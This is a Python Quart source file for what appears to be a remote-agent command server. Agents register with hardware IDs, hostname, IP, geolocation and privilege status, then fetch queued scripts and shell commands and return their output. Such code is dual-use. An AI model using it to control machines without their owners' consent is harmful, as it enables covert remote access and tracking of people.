import asyncio
import base64
import datetime
import aiosqlite
import html
from quart import request, jsonify
import json
import re

from config import DATABASE
from util.rate_limit import api_rate_limit


def sanitize_input(value):
    if isinstance(value, str):
        return html.escape(value)
    return value


def register_client_routes(app):
    """Register client API routes with the app"""

    @app.route("/api/client/<base64_hwid>", methods=["POST", "GET"])
    @api_rate_limit()
    async def client_endpoint(base64_hwid):
        """Unified endpoint for client communication - handles both registration and command fetching"""
        try:

            hwid = base64.b64decode(base64_hwid).decode("utf-8")
            client_ip = request.remote_addr

            if request.method == "POST":

                if not request.is_json:
                    return (
                        jsonify(
                            {"status": "error", "message": "Invalid request format"}
                        ),
                        400,
                    )

                client_data = await request.get_json()

                if "PCINFO" in client_data:
                    pcinfo = client_data["PCINFO"]
                    country_code = sanitize_input(pcinfo.get("country_code", "Unknown"))
                    hostname = sanitize_input(
                        pcinfo.get("hostname", f"unknown-{client_ip}")
                    )
                    latitude = float(pcinfo.get("lat", 0.0))
                    longitude = float(pcinfo.get("lon", 0.0))
                    elevated_status = sanitize_input(pcinfo.get("elevated_status", "Unknown"))

                    async with aiosqlite.connect(DATABASE) as db:

                        async with db.execute(
                            "SELECT id, pcname FROM user WHERE hwid = ?", [hwid]
                        ) as cursor:
                            user = await cursor.fetchone()

                        if user:

                            # Check if user is in grace period (marked for deletion within last 60 seconds)
                            current_time = int(asyncio.get_event_loop().time())
                            if user[1] and str(user[1]).startswith("PENDING_DELETION_"):
                                # Check if grace period has expired
                                async with db.execute(
                                    "SELECT last_ping FROM user WHERE hwid = ?", [hwid]
                                ) as cursor:
                                    grace_period_result = await cursor.fetchone()
                                
                                if grace_period_result and grace_period_result[0]:
                                    try:
                                        grace_period_end = int(grace_period_result[0])
                                        if current_time < grace_period_end:
                                            # Still in grace period - block ping updates but allow script fetching
                                            # This prevents re-registration while allowing termination scripts
                                            remaining_time = grace_period_end - current_time
                                            return jsonify(
                                                {
                                                    "status": "error",
                                                    "message": f"Agent is terminating and cannot update status for {remaining_time} more seconds",
                                                    "terminating": True,
                                                    "remaining_time": remaining_time
                                                }
                                            ), 403
                                    except (ValueError, TypeError):
                                        # If timestamp parsing fails, still block communication
                                        return jsonify({
                                            "status": "error",
                                            "message": "Agent is terminating and cannot communicate further",
                                            "terminating": True
                                        }), 403
                                
                                # If grace period has expired, allow normal communication again
                                # The agent can re-register normally after the grace period
                                pass

                            # Check if this agent was previously marked for deletion (rejoining agent)
                            was_deleted = str(user[1]).startswith("PENDING_DELETION_")
                            
                            await db.execute(
                                """
                                UPDATE user 
                                SET last_ping = CURRENT_TIMESTAMP, 
                                    is_active = 1,
                                    ip_address = ?,
                                    country = ?,
                                    hostname = ?,
                                    latitude = ?,
                                    longitude = ?,
                                    elevated_status = ?,
                                    pcname = ?
                                WHERE hwid = ?
                                """,
                                [
                                    client_ip,
                                    country_code,
                                    hostname,
                                    latitude,
                                    longitude,
                                    elevated_status,
                                    hostname,  # Restore pcname to hostname (removes PENDING_DELETION_ prefix)
                                    hwid,
                                ],
                            )
                            await db.commit()
                            
                            # Send notification for rejoining agent if it was previously deleted
                            if was_deleted:
                                try:
                                    from .notifications import send_agent_join_notification
                                    agent_info = {
                                        'hostname': hostname,
                                        'ip_address': client_ip,
                                        'country': country_code,
                                        'elevated_status': elevated_status,
                                        'hwid': hwid,
                                        'is_new': False,
                                        'was_deleted': True
                                    }
                                    # Run notification in background to avoid blocking client response
                                    asyncio.create_task(send_agent_join_notification(agent_info))
                                except Exception as e:
                                    print(f"Error sending agent rejoin notification: {e}")

                            return jsonify(
                                {
                                    "status": "success",
                                    "message": "Ping received",
                                    "user_type": "existing",
                                    "new_run": False,
                                    "scripts": [],
                                }
                            )
                        else:

                            # Check if this HWID was recently marked for deletion (within grace period)
                            async with db.execute(
                                "SELECT pcname, last_ping FROM user WHERE hwid = ?", [hwid]
                            ) as cursor:
                                deleted_user = await cursor.fetchone()
                            
                            if deleted_user and deleted_user[0] and str(deleted_user[0]).startswith("PENDING_DELETION_"):
                                # Check if grace period has expired
                                if deleted_user[1]:
                                    try:
                                        grace_period_end = int(deleted_user[1])
                                        if current_time < grace_period_end:
                                            # Still in grace period - block new registration
                                            remaining_time = grace_period_end - current_time
                                            return jsonify(
                                                {
                                                    "status": "error",
                                                    "message": f"Agent is blocked from re-registration for {remaining_time} more seconds",
                                                    "terminating": True,
                                                    "remaining_time": remaining_time
                                                }
                                            ), 403
                                    except (ValueError, TypeError):
                                        # If timestamp parsing fails, still block registration
                                        return jsonify({
                                            "status": "error",
                                            "message": "Agent was marked for deletion and cannot re-register",
                                            "terminated": True
                                        }), 403
                                
                                # If grace period has expired, allow new registration
                                # The agent can re-register normally after the grace period
                                pass

                            await db.execute(
                                """
                                INSERT INTO user 
                                (pcname, ip_address, country, latitude, longitude, last_ping, first_ping, is_active, hwid, hostname, elevated_status) 
                                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 1, ?, ?, ?)
                                """,
                                [
                                    hostname,
                                    client_ip,
                                    country_code,
                                    latitude,
                                    longitude,
                                    hwid,
                                    hostname,
                                    elevated_status,
                                ],
                            )
                            await db.commit()

                            # Send notification for new agent
                            try:
                                from .notifications import send_agent_join_notification
                                agent_info = {
                                    'hostname': hostname,
                                    'ip_address': client_ip,
                                    'country': country_code,
                                    'elevated_status': elevated_status,
                                    'hwid': hwid,
                                    'is_new': True
                                }
                                # Run notification in background to avoid blocking client response
                                asyncio.create_task(send_agent_join_notification(agent_info))
                            except Exception as e:
                                print(f"Error sending agent join notification: {e}")

                            return jsonify(
                                {
                                    "status": "success",
                                    "message": "New client registered",
                                    "user_type": "new",
                                    "auto_load": False,
                                    "auto_load_script": [],
                                    "new_run": False,
                                    "scripts": [],
                                }
                            )

                return (
                    jsonify({"status": "error", "message": "Invalid data format"}),
                    400,
                )

            else:  # get requests

                async with aiosqlite.connect(DATABASE) as db:
                    db.row_factory = aiosqlite.Row

                    async with db.execute(
                        "SELECT id, pcname FROM user WHERE hwid = ?", [hwid]
                    ) as cursor:
                        user = await cursor.fetchone()

                    if not user:
                        return (
                            jsonify({"status": "error", "message": "Unknown client"}),
                            404,
                        )
                    
                    # Check if this agent is marked for deletion - if so, block ping updates but allow script fetching
                    should_update_ping = True
                    if user[1] and str(user[1]).startswith("PENDING_DELETION_"):
                        async with db.execute(
                            "SELECT last_ping FROM user WHERE hwid = ?", [hwid]
                        ) as cursor:
                            grace_period_result = await cursor.fetchone()
                        
                        if grace_period_result and grace_period_result[0]:
                            try:
                                grace_period_end = int(grace_period_result[0])
                                current_time = int(asyncio.get_event_loop().time())
                                if current_time < grace_period_end:
                                    # Still in grace period - block ping updates but allow script fetching
                                    # This prevents re-registration while ensuring termination scripts can be fetched
                                    should_update_ping = False
                                else:
                                    # Grace period expired - allow normal communication
                                    should_update_ping = True
                            except (ValueError, TypeError):
                                # If timestamp parsing failed, allow communication
                                should_update_ping = True
                        else:
                            # No grace period timestamp - allow communication
                            should_update_ping = True

                    # Only update ping and status if not in grace period
                    if should_update_ping:
                        # Get current user info to check if pcname needs restoration
                        async with db.execute(
                            "SELECT pcname, hostname FROM user WHERE hwid = ?", [hwid]
                        ) as cursor:
                            current_user = await cursor.fetchone()
                        
                        # Restore pcname if it was marked for deletion
                        pcname_to_set = current_user["hostname"] if str(current_user["pcname"]).startswith("PENDING_DELETION_") else current_user["pcname"]
                        
                        await db.execute(
                            """
                            UPDATE user 
                            SET last_ping = CURRENT_TIMESTAMP, 
                                is_active = 1,
                                pcname = ?
                            WHERE hwid = ?
                            """,
                            [pcname_to_set, hwid],
                        )
                        await db.commit()

                    # Get autorun scripts (run only once per agent when enabled)
                    async with db.execute(
                        """
                        SELECT s.id, s.content, s.execution_order, s.created_at
                        FROM scripts s
                        JOIN user u ON s.user_id = u.id
                        WHERE u.hwid = ? AND s.autorun = 1 AND s.executed = 0 AND s.is_system = 0
                        
                        UNION
                        
                        SELECT s.id, s.content, s.execution_order, s.created_at
                        FROM scripts s
                        WHERE s.is_global = 1 AND s.autorun = 1 AND s.executed = 0 AND s.is_system = 0
                        
                        ORDER BY execution_order ASC, created_at ASC
                        """,
                        [hwid],
                    ) as cursor:
                        autorun_scripts = await cursor.fetchall()
                    
                    # Get startup scripts (run once when agent connects, then only when manually reset)
                    # Include system scripts (like termination scripts) when they're startup scripts
                    async with db.execute(
                        """
                        SELECT s.id, s.content, s.execution_order, s.created_at
                        FROM scripts s
                        JOIN user u ON s.user_id = u.id
                        WHERE u.hwid = ? AND s.startup = 1 AND s.executed = 0
                        
                        UNION
                        
                        SELECT s.id, s.content, s.execution_order, s.created_at
                        FROM scripts s
                        WHERE s.is_global = 1 AND s.startup = 1 AND s.executed = 0 AND s.is_system = 0
                        
                        ORDER BY execution_order ASC, created_at ASC
                        """,
                        [hwid],
                    ) as cursor:
                        startup_scripts = await cursor.fetchall()
                    
                    # Debug: Check for system scripts specifically
                    async with db.execute(
                        """
                        SELECT s.id, s.content, s.name, s.is_system, s.startup, s.executed
                        FROM scripts s
                        JOIN user u ON s.user_id = u.id
                        WHERE u.hwid = ? AND s.is_system = 1
                        """,
                        [hwid],
                    ) as cursor:
                        system_scripts = await cursor.fetchall()
                        #print(f"[DEBUG] Agent {hwid} - Found {len(system_scripts)} system scripts:")
                        #for script in system_scripts:
                        #    print(f"  - ID: {script['id']}, Name: {script['name']}, System: {script['is_system']}, Startup: {script['startup']}, Executed: {script['executed']}")
                    
                    # Debug: Check ALL scripts for this agent
                    async with db.execute(
                        """
                        SELECT s.id, s.content, s.name, s.is_system, s.startup, s.executed, s.autorun
                        FROM scripts s
                        JOIN user u ON s.user_id = u.id
                        WHERE u.hwid = ?
                        """,
                        [hwid],
                    ) as cursor:
                        all_agent_scripts = await cursor.fetchall()
                        #print(f"[DEBUG] Agent {hwid} - Found {len(all_agent_scripts)} total scripts:")
                        #for script in all_agent_scripts:
                        #    print(f"  - ID: {script['id']}, Name: {script['name']}, System: {script['is_system']}, Startup: {script['startup']}, Executed: {script['executed']}, Autorun: {script['autorun']}")
                    
                    # Get manually executed scripts (scripts that were explicitly reset to executed = 0)
                    # This does NOT include new scripts - only scripts that were manually triggered
                    # We need to track which scripts were manually executed vs new scripts
                    async with db.execute(
                        """
                        SELECT s.id, s.content, s.execution_order, s.created_at
                        FROM scripts s
                        JOIN user u ON s.user_id = u.id
                        WHERE u.hwid = ? AND s.executed = 0 AND s.autorun = 0 AND s.startup = 0
                        AND s.manually_triggered = 1 AND s.is_system = 0
                        
                        UNION
                        
                        SELECT s.id, s.content, s.execution_order, s.created_at
                        FROM scripts s
                        WHERE s.is_global = 1 AND s.executed = 0 AND s.autorun = 0 AND s.startup = 0
                        AND s.manually_triggered = 1 AND s.is_system = 0
                        
                        ORDER BY execution_order ASC, created_at ASC
                        """,
                        [hwid],
                    ) as cursor:
                        manual_scripts = await cursor.fetchall()
                    
                    # Immediately mark manual scripts as executed to prevent duplicate fetches
                    for script in manual_scripts:
                        await db.execute(
                            "UPDATE scripts SET executed = 1 WHERE id = ?",
                            [script["id"]]
                        )
                    
                    # Combine all scripts: startup first, then autorun, then manual execution
                    all_scripts = list(startup_scripts) + list(autorun_scripts) + list(manual_scripts)
                    
                    # Debug logging
                    print(f"[DEBUG] Agent {hwid} fetched scripts:")
                    print(f"  - Startup scripts: {len(startup_scripts)}")
                    for script in startup_scripts:
                        print(f"    - Startup script ID: {script['id']}")
                    print(f"  - Autorun scripts: {len(autorun_scripts)}")
                    print(f"  - Manual scripts: {len(manual_scripts)}")
                    print(f"  - Total scripts: {len(all_scripts)}")

                    script_list = []
                    for script in all_scripts:
                        script_content = script["content"]
                        script_base64 = base64.b64encode(
                            script_content.encode()
                        ).decode()
                        script_list.append(script_base64)

                        # Mark autorun and startup scripts as executed (they run once)
                        # Manual scripts are already marked as executed above
                        if script in autorun_scripts or script in startup_scripts:
                            await db.execute(
                                "UPDATE scripts SET executed = 1 WHERE id = ?",
                                [script["id"]],
                            )

                    # Check for console commands that need to be sent
                    async with db.execute(
                        """
                        SELECT id, command, shell_type
                        FROM console_commands
                        WHERE user_id = ? AND status = 'pending'
                        ORDER BY created_at ASC
                        """,
                        [user["id"]],
                    ) as cursor:
                        console_commands = await cursor.fetchall()

                    console_commands_list = []
                    for cmd in console_commands:
                        console_commands_list.append({
                            "id": cmd["id"],
                            "command": cmd["command"],
                            "shell_type": cmd["shell_type"]
                        })

                        # Mark command as executing (received by client)
                        await db.execute(
                            "UPDATE console_commands SET status = 'executing' WHERE id = ?",
                            [cmd["id"]],
                        )

                    await db.commit()

                    return jsonify(
                        {
                            "status": "success",
                            "new_run": len(script_list) > 0,
                            "scripts": script_list,
                            "console_commands": console_commands_list
                        }
                    )

        except Exception as e:
            print(f"Error processing client request: {e}")
            return jsonify({"status": "error", "message": "Server error"}), 500

    @app.route("/log", methods=["POST"])
    @api_rate_limit()
    async def client_log():
        """Endpoint for clients to send log messages"""
        if not request.is_json:
            return (
                jsonify({"status": "error", "message": "Invalid request format"}),
                400,
            )

        try:
            log_data = await request.get_json()
            hwid = sanitize_input(log_data.get("HWID", ""))
            error_message = sanitize_input(log_data.get("error_message", ""))
            log_type = sanitize_input(log_data.get("type", ""))

            print(f"Client log from {hwid}: [{log_type}] {error_message}")

            return jsonify({"status": "success"})

        except Exception as e:
            print(f"Error processing client log: {e}")
            return jsonify({"status": "error", "message": "Server error"}), 500

    @app.route("/console/output", methods=["POST"])
    @api_rate_limit()
    async def console_output():
        """Endpoint for clients to submit console command output"""
        if not request.is_json:
            return (
                jsonify({"status": "error", "message": "Invalid request format"}),
                400,
            )

        try:
            # Handle potential encoding issues by getting raw data first
            try:
                data = await request.get_json()
            except UnicodeDecodeError as e:
                print(f"[DEBUG] Unicode decode error, trying alternative encoding: {e}")
                # Try to get raw data and decode with different encodings
                raw_data = await request.get_data(cache=False)
                
                # Try different encodings
                for encoding in ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']:
                    try:
                        decoded_data = raw_data.decode(encoding)
                        data = json.loads(decoded_data)
                        print(f"[DEBUG] Successfully decoded with {encoding} encoding")
                        break
                    except (UnicodeDecodeError, json.JSONDecodeError):
                        continue
                else:
                    # If all encodings fail, try to extract what we can
                    print(f"[DEBUG] All encodings failed, attempting manual parsing")
                    try:
                        # Try to extract basic info from raw data
                        raw_str = raw_data.decode('latin-1', errors='ignore')
                        # Look for JSON-like patterns
                        if 'command_id' in raw_str and 'HWID' in raw_str:
                            # Extract key values manually
                            command_id_match = re.search(r'"command_id"\s*:\s*(\d+)', raw_str)
                            hwid_match = re.search(r'"HWID"\s*:\s*"([^"]+)"', raw_str)
                            status_match = re.search(r'"status"\s*:\s*"([^"]+)"', raw_str)
                            
                            if command_id_match and hwid_match:
                                data = {
                                    'command_id': int(command_id_match.group(1)),
                                    'HWID': hwid_match.group(1),
                                    'status': status_match.group(1) if status_match else 'completed',
                                    'output': 'Output truncated due to encoding issues'
                                }
                                print(f"[DEBUG] Manually parsed data: {data}")
                            else:
                                raise ValueError("Could not extract required fields")
                        else:
                            raise ValueError("No recognizable JSON structure found")
                    except Exception as manual_error:
                        print(f"[DEBUG] Manual parsing also failed: {manual_error}")
                        return jsonify({"status": "error", "message": "Invalid data encoding"}), 400
            
            print(f"[DEBUG] Received console output data: {data}")
            
            command_id = data.get("command_id")
            output = sanitize_input(data.get("output", ""))
            status = sanitize_input(data.get("status", "completed"))
            hwid = sanitize_input(data.get("HWID", ""))

            print(f"[DEBUG] Parsed data - command_id: {command_id}, status: {status}, hwid: {hwid}")
            print(f"[DEBUG] Output length: {len(output) if output else 0}")

            if not command_id or not hwid:
                return (
                    jsonify({"status": "error", "message": "Missing command_id or HWID"}),
                    400,
                )

            # Verify the command belongs to this client
            async with aiosqlite.connect(DATABASE) as db:
                db.row_factory = aiosqlite.Row
                
                # Get user ID from HWID
                cursor = await db.execute("SELECT id FROM user WHERE hwid = ?", [hwid])
                user = await cursor.fetchone()
                
                if not user:
                    print(f"[DEBUG] User not found for HWID: {hwid}")
                    return (
                        jsonify({"status": "error", "message": "Unknown client"}),
                        404,
                    )
                
                print(f"[DEBUG] Found user ID: {user['id']}")
                
                # Check if the console command exists
                cursor = await db.execute("SELECT id, user_id FROM console_commands WHERE id = ?", [command_id])
                command_record = await cursor.fetchone()
                
                if not command_record:
                    print(f"[DEBUG] Console command {command_id} not found in database")
                    return (
                        jsonify({"status": "error", "message": "Console command not found"}),
                        404,
                    )
                
                print(f"[DEBUG] Found console command: ID={command_record['id']}, user_id={command_record['user_id']}")
                
                # Verify the command belongs to this user
                if command_record["user_id"] != user["id"]:
                    print(f"[DEBUG] Command {command_id} belongs to user {command_record['user_id']}, not {user['id']}")
                    return (
                        jsonify({"status": "error", "message": "Command access denied"}),
                        403,
                    )
                
                # Update the console command with output
                print(f"[DEBUG] Updating console command {command_id} with output length {len(output)}")
                await db.execute(
                    """
                    UPDATE console_commands 
                    SET output = ?, status = ?, executed_at = CURRENT_TIMESTAMP
                    WHERE id = ?
                    """,
                    [output, status, command_id]
                )
                await db.commit()
                print(f"[DEBUG] Console command {command_id} updated successfully")

            return jsonify({"status": "success"})

        except Exception as e:
            print(f"Error processing console output: {e}")
            print(f"Error details: {type(e).__name__}: {str(e)}")
            import traceback
            print(f"Full traceback: {traceback.format_exc()}")
            return jsonify({"status": "error", "message": "Server error"}), 500

    return app
